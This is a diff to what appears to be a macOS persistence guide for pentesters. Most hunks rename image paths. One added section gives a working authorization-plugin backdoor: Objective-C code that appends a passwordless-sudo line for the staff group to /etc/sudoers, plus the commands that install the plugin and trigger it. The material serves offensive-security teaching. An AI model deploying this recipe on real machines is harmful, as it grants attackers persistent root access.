@@ -472,7 +472,7 @@ The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2
 
 This setting can be configured in the iTerm2 settings:
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 And the command is reflected in the preferences:
 
@@ -797,7 +797,7 @@ mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 
 Then, open the `Folder Actions Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called it output2.scp):
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
 
 Now, if you open that folder with **Finder**, your script will be executed.
 
@@ -995,7 +995,7 @@ Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 * `~/Library/Screen Savers`
   * **Trigger**: Select the screen saver
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
 
 #### Description & Exploit
 
@@ -1334,6 +1334,58 @@ Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authoriza
 #### Description & Exploitation
 
 You can create an authorization plugin that will be executed when a user logs in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).
+
+```objectivec
+// Compile the code and create a real bundle
+// gcc -bundle -framework Foundation main.m -o CustomAuth
+// mkdir -p CustomAuth.bundle/Contents/MacOS
+// mv CustomAuth CustomAuth.bundle/Contents/MacOS/
+
+#import <Foundation/Foundation.h>
+
+__attribute__((constructor)) static void run()
+{
+    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
+    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
+}
+```
+
+**Move** the bundle to the location to be loaded:
+
+```bash
+cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
+```
+
+Finally add the **rule** to load this Plugin:
+
+
+
+```bash
+cat > /tmp/rule.plist <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+            <key>class</key>
+            <string>evaluate-mechanisms</string>
+            <key>mechanisms</key>
+            <array>
+                <string>CustomAuth:login,privileged</string>
+            </array>
+        </dict>
+</plist>
+EOF
+
+security authorizationdb write com.asdf.asdf < /tmp/rule.plist
+```
+
+Trigger it with:
+
+```bash
+security authorize com.asdf.asdf
+```
+
+And then the **staff group should have sudo** access (read `/etc/sudoers` to confirm).
 
 ### Man.conf
 
